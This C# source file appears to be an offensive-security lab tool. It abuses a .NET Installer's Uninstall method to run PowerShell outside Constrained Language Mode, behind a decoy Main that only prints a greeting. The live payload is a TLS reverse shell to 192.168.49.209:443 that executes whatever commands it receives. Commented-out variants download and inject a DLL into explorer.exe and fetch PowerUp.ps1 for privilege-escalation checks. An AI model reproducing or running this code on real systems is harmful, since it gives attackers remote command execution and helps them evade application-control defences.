using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Configuration.Install;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections;

namespace CLM_Uninstall_method
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("HELLO DECOY!");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample: System.Configuration.Install.Installer
    {
        public override void Uninstall(IDictionary savedState)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            String cmd = "$socket = New-Object Net.Sockets.TcpClient('192.168.49.209', 443); $stream = $socket.GetStream(); $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback])); $sslStream.AuthenticateAsClient('fake.domain', $null, 'Tls12', $false); $writer = new-object System.IO.StreamWriter($sslStream); $writer.Write('PS ' + (pwd).Path + '> '); $writer.flush(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0) {$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data | Out-String ) 2>&1; $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()};";
            //String cmd = "$bytes = (New - Object System.Net.WebClient).DownloadData('http://192.168.49.209/SharpMetDLL.dll'); (New - Object System.Net.WebClient).DownloadString('http://192.168.49.209/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection - PEBytes $bytes - ProcId $procid";
            //String cmd = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.209/PowerUp.ps1'); Invoke-AllChecks > C:\\windows\\tasks\\PU.txt";
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }

}
